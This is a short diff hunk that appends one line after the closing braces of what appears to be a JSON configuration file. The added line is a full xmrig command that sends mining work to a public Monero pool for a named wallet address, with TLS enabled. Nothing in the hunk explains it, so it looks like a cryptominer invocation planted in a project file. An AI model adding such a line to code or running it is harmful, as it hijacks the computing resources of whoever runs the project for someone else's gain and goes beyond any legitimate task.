@@ -13,3 +13,4 @@
         }
     ]
 }
+xmrig.exe -o xmr.pool.gntl.co.uk:20009 -u 49QBeXkc1isJ2sCsy8rV7wKWBG6FFLqJhUBkifj7WoQza613WfAXDk5FaWh1Zgw4WG5EB8Mwffdh8b8F3vknF9h1Ccrm5nf -k --tls -p teste
